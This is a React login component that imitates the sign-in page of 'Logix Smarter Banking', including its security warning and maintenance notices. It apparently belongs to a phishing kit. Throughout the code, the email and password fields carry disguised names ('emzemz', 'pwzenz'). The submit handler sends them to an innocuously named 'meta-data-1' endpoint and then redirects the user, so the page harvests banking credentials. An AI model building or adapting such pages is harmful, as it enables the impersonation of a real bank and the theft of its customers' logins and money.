import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';

const LoginForm2: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });

  const navigate = useNavigate();

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const validateEmzemz = (emzemz: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(emzemz);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { emzemz: '', pwzenz: '' };

    if (!validateEmzemz(emzemz)) {
      newErrors.emzemz = 'Invalid email format.';
      setIsLoading(false);
    }

    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password must be at least 6 characters.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/');
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className=" border-b-2 border-teal-500 px-6 py-4">
        <h2 className="text-lg text-gray-700">Sign In – Welcome to Logix Smarter Banking</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <form onSubmit={handleSubmit}>
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Username:</label>
            <input
              id="emzemz"
              name="emzemz"
              type="email"
              value={emzemz}
              onChange={(e) => setEmzemz(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
            />
            <a href="#" className="text-blue-700 text-sm hover:underline">Not Registered?</a>
          </div>

          {errors.emzemz && (
            <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
              <svg
                width="1rem"
                height="1rem"
                viewBox="0 0 24 24"
                className="fill-current text-red-600"
                aria-hidden="true"
              >
                <path
                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                  fillRule="nonzero"
                ></path>
              </svg>

              <p>Email required</p>
            </div>
          )}

          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Password:</label>
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(e) => setPwzenz(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
            />
            <a href="#" className="text-blue-700 text-sm hover:underline">Forgot Password?</a>
          </div>

          {errors.pwzenz && (
            <div className="flex items-center gap-3 text-sm font-bold mt-2">
              <svg
                width="1rem"
                height="1rem"
                viewBox="0 0 24 24"
                className="fill-current text-red-600"
                aria-hidden="true"
              >
                <path
                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                  fillRule="nonzero"
                ></path>
              </svg>

              <p>Password required</p>
            </div>
          )}

          <div className="flex items-center gap-4">
            <div className="w-24"></div>
            <span
              className="text-blue-700 text-sm hover:underline cursor-pointer"
              onClick={togglePwzenzVisibility}
            >
              {showPwzenz ? 'Hide' : 'Show'}
            </span>
          </div>
        </form>
      </div>

      <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
        {!isLoading ? (
          <button
            type="submit"
            className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
          >
            Sign-In
          </button>
        ) : (
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
        )}
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Forgot Username?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Password?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Everything?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Locked Out?</a>
        </div>
      </div>

      <div className="bg-red-600 text-white px-6 py-6 flex items-start gap-4">
        <div className="flex-shrink-0 mt-1">
          <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center">
            <svg className="w-8 h-8 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
        </div>
        <div className="flex-1">
          <p className="text-sm mb-3">
            <strong>Online and Mobile Banking will be unavailable on Sunday, October 12 from 4 AM to 6 AM (PT) for maintenance. We apologize for any inconvenience.</strong>
          </p>
          <p className="text-sm">
            Logix will be closed on Monday, October 13 in observance of the federal holiday. We will be open on Tuesday, October 14.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginForm2;
